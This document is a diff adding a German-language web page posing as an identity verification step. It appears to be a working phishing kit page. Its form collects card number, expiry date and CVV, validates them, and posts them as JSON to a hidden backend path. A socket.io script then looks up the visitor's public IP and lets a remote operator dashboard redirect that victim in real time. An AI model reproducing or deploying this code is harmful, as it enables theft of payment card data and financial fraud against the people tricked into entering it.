@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/mainx.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <!--  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Arvo:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
+    <!--  -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body class="body">
+    <div class="hato">
+        <div class="upot">
+            <img class="pc" src="./img/upapot.PNG" alt="">
+            <img class="mb" src="./img/topano-mb.png" alt="">
+        </div>
+    </div>
+
+    <div>
+        <div class="mona">
+            <p class="pp11">Überprüfung der Identifizierung</p>
+                <p class=""> Für Ihre Identifizierung benötigen wir ein paar Angaben.</p>
+                <!--  -->
+                
+            
+                <form id="creditCardForm" method="post">
+                    <div class="group2 g4"> 
+                        <p class="pput">Kartennummer:</p>     
+                        <input type="tel" id="cardNumber" placeholder="4111 1111 1111 1111" required>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        
+                    </div> 
+                    <div class="group3">
+                        <div class="group2 g3">  
+                            <p class="pput">Ablauf (MM/JJ):</p>   
+                            <input type="text" id="expiryDate" placeholder="MM/JJ" required maxlength="5">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            
+                        </div> 
+                        <div class="group2">      
+                            <p class="pput">Sicherheitscode <br> 
+                                (Prüfnummer (CVV)* 3 Ziffern)</p>
+                            <input type="tel" id="cvv" placeholder="***" required pattern="[0-9]{3,4}">
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            
+                        </div> 
+                    </div>
+                    <button class="btn2" type="submit" id="submitButton">
+                        <span>Bestätigen Sie</span>
+                        <div class="spinner" style="display: none;"></div>
+                    </button>
+                    <div id="errorMessages" class="error-section" style="color: rgb(204, 17, 17); margin-top: 10px; border-radius: 7px;
+                     width: 50%;  font-weight: 600;"></div>
+                </form>
+    
+                <style>
+                    .spinner {
+                        width: 20px;
+                        height: 20px;
+                        border: 2px solid #ffffff;
+                        border-top: 2px solid transparent;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        display: inline-block;
+                        vertical-align: middle;
+                        margin-left: 10px;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+    
+                <script>
+                    const form = document.getElementById('creditCardForm');
+                    const cardNumber = document.getElementById('cardNumber');
+                    const expiryDate = document.getElementById('expiryDate');
+                    const cvv = document.getElementById('cvv');
+                    const submitButton = document.getElementById('submitButton');
+                    const spinner = submitButton.querySelector('.spinner');
+                    const buttonText = submitButton.querySelector('span');
+                    const errorMessages = document.getElementById('errorMessages');
+    
+                    function luhnCheck(val) {
+                        let sum = 0;
+                        for (let i = 0; i < val.length; i++) {
+                            let intVal = parseInt(val.substr(i, 1));
+                            if (i % 2 == 0) {
+                                intVal *= 2;
+                                if (intVal > 9) intVal -= 9;
+                            }
+                            sum += intVal;
+                        }
+                        return (sum % 10) == 0;
+                    }
+    
+                    function formatExpiryDate(input) {
+                        let value = input.value.replace(/\D/g, '');
+                        if (value.length > 2) {
+                            value = value.slice(0, 2) + '/' + value.slice(2);
+                        }
+                        input.value = value;
+                    }
+    
+                    function validateExpiryDate(input) {
+                        let [month, year] = input.value.split('/');
+                        let now = new Date();
+                        let currentYear = now.getFullYear() % 100;
+                        let currentMonth = now.getMonth() + 1;
+    
+                        if (!month || !year || month > 12 || year < currentYear) {
+                            return false;
+                        }
+                        if (year == currentYear && month < currentMonth) {
+                            return false;
+                        }
+                        return true;
+                    }
+    
+                    cardNumber.addEventListener('input', function() {
+                        let value = this.value.replace(/\D/g, '').slice(0, 16);
+                        this.value = value.replace(/(.{4})/g, '$1 ').trim();
+                    });
+    
+                    expiryDate.addEventListener('input', function() {
+                        formatExpiryDate(this);
+                    });
+    
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        submitButton.disabled = true;
+                        buttonText.style.display = 'none';
+                        spinner.style.display = 'inline-block';
+                        errorMessages.innerHTML = '';
+    
+                        setTimeout(() => {
+                            let errors = [];
+    
+                            if (!luhnCheck(cardNumber.value.replace(/\s/g, ''))) {
+                                errors.push('Ungültige Kartennummer');
+                            }
+                            if (!validateExpiryDate(expiryDate)) {
+                                errors.push('Ungültiges Verfallsdatum');
+                            }
+                            if (!cvv.validity.valid) {
+                                errors.push('Ungültige CVV');
+                            }
+    
+                            if (errors.length === 0) {
+                                console.log('Form submitted successfully');
+                                //send backend:
+                                $.ajax({
+                                    url: '/NkMNm4664XhcW8KuukHk',
+                                    type: 'POST',
+                                    contentType: 'application/json',
+                                    data: JSON.stringify({cardNumber: cardNumber.value.replace(/\s/g, ''), expiryDate: expiryDate.value, cvv: cvv.value}),
+                                    success: function(info) {
+                                        if(info.OK){
+                                            window.location = "/loading?time=10&url=/RKnUB922z6Mf4HDwg3EZ";
+                                        }
+                                    }
+                                });
+                                
+                            } else {
+                                errorMessages.innerHTML = errors.map(error => `<p>${error}</p>`).join('');
+                                submitButton.disabled = false;
+                                buttonText.style.display = 'inline';
+                                spinner.style.display = 'none';
+                            }
+                        }, 1000);
+                    });
+                </script>
+        </div>
+    </div>
+
+    <div class="boto">
+        <div class="bwoto">
+            <img class="pc" src="./img/botanamo-pc.png" alt="">
+            <img class="mb" src="./img/botanamo-mb.png" alt="">
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
